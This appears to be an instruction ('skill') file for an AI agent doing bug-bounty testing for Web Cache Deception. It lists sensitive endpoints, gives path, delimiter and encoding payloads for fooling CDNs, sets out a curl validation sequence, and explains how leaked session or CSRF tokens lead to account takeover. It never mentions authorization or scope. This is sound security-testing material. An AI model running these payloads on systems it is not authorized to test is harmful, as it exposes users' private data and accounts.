# SKILL: Advanced Web Cache Deception (WCD)

## Description
Identify, exploit, and escalate Web Cache Deception vulnerabilities. This skill targets discrepancies in HTTP request parsing between Edge Proxies (CDN/Cache) and Origin Servers, forcing the cache to store and serve private, authenticated data to unauthenticated attackers.

## 🧠 The Elite Hacker Mindset
A standard hunter looks for `/profile/test.css`. An elite hunter looks for framework-specific quirks, matrix parameters, and normalization failures that bypass standard WAF/CDN rules. Your ultimate goal is not just to leak an email address, but to escalate the finding to **Account Takeover (ATO)** by leaking Session Tokens, OAuth codes, or CSRF tokens.

---

## 🎯 High-Value Targeting (Don't waste time on static pages)
Focus strictly on endpoints that return dynamically generated, user-specific data.
* **Account/Identity:** `/api/v1/users/me`, `/profile`, `/settings/security`
* **Financial/Billing:** `/invoices`, `/payment-methods`, `/billing`
* **Tokens/Auth:** `/oauth/tokens`, `/api/auth/session`, `/csrf-token`
* **Next.js specific:** `/_next/data/{build_id}/profile.json`

---

## 🔬 Advanced Methodology & Fuzzing Logic

### Phase 1: CDN & Framework Profiling
Before firing payloads, understand the architecture.
1. **Identify the Cache:** Look for `CF-Cache-Status` (Cloudflare), `X-Cache` (AWS CloudFront/Akamai), `X-Served-By` (Fastly), `Age`, `Via`.
2. **Identify the Framework:** Is the origin running Spring Boot? Express? Django? Next.js? (This dictates how delimiters are parsed).
3. **Determine the Cache Key:** Send `?cb=1` and `?cb=2`. If both return `MISS` then hit `HIT` on reload, the query string is part of the cache key. **Crucial:** Always use unique cache busters during testing to avoid caching real users' data!

### Phase 2: The Multi-Layer Discrepancy Fuzzing (Write-up Tactics)

**Tactic 1: Standard Extension Bypasses**
Append static extensions recognized by most CDNs.
* `GET /profile/nonexistent.css`
* `GET /profile/nonexistent.woff2` (CDNs often cache fonts aggressively)
* `GET /profile/nonexistent.js`

**Tactic 2: Matrix Parameters & Delimiters (Spring Boot / Java Focus)**
Java/Spring often strips data after a semicolon, but CDNs do not.
* `GET /profile;v=1.1.css`
* `GET /profile;/.css`
* `GET /profile;any_string/test.css`

**Tactic 3: Advanced Normalization & Encoding (Express / Ruby Focus)**
Force discrepancies in how the CDN and Origin decode URLs.
* **Single Encoding:** `GET /profile%2f%2e%2e%2fstatic/style.css`
* **Double Encoding (Bypass WAFs):** `GET /profile%252f%252e%252e%252fstatic/style.css`
* **Path Parameters:** `GET /profile/a=b/.css`

**Tactic 4: Next.js Data Cache Deception**
Next.js fetches dynamic data via JSON. If the CDN caches `/_next/data/` based on extensions incorrectly:
* `GET /_next/data/XYZ123/profile.json`
* *Exploit Attempt:* Can you force a static extension into this path? `GET /_next/data/XYZ123/profile.json/test.css`

**Tactic 5: Method Override & Pseudo-Static**
Sometimes GET is protected, but what if you force caching on an endpoint that shouldn't be?
* Send a request to `/profile` but append a cacheable query parameter if the CDN strips it: `GET /profile?style=main.css`

### Phase 3: Impact Escalation (Bounty Multiplier)
If you successfully cache a response, analyze the leaked data.
1. **Low Impact ($):** Email, Name, Address.
2. **High Impact ($$):** Credit Card Last 4, Internal API Keys, Purchase History.
3. **Critical Impact ($$$) [ATO]:** 
   * Look for `csrftoken` inside the HTML/JSON response.
   * Look for `<script>window.__INITIAL_STATE__ = {"session":"eyJ..."}</script>`.
   * If you leak a CSRF token, explain how it chains into a state-changing attack (e.g., changing the victim's password/email).

---

## 🚫 The "Zero False Positive" Validation Pipeline
You MUST execute this exact sequence before generating a finding:

1. **Victim Authenticated Request:**
   * Command: `curl -H "Cookie: session=VICTIM" -i "https://target.com/profile;.css?cb=123"`
   * Verify: Response contains Victim's PII. Headers show `X-Cache: MISS`.
2. **Cache Priming:**
   * Repeat the exact command until Headers show `X-Cache: HIT` (or `Age` > 0).
3. **Attacker Unauthenticated Request (THE ULTIMATE TEST):**
   * Command: `curl -i "https://target.com/profile;.css?cb=123"` (NO COOKIES/AUTH).
   * Verify: Response STILL contains Victim's PII. Headers show `X-Cache: HIT`.

**IF THE UNAUTHENTICATED REQUEST FAILS TO RETRIEVE THE PII, IT IS NOT A VULNERABILITY. DO NOT REPORT IT.**

---

## 📝 Elite Triager Reporting Standard
A valid report must be undeniable.
1. **The Architecture Flaw:** Explain *why* it happened (e.g., "Cloudflare cached based on the `.css` extension, but the Django origin ignored the semicolon matrix parameter, serving the dynamic profile.").
2. **The Step-by-Step PoC:** Provide exact `curl` commands demonstrating the Cross-Session Leakage.
3. **The Weaponized Impact:** Do not just say "PII leak". Say "Account Takeover via Leaked CSRF Token through Web Cache Deception." Provide a clear attack narrative.
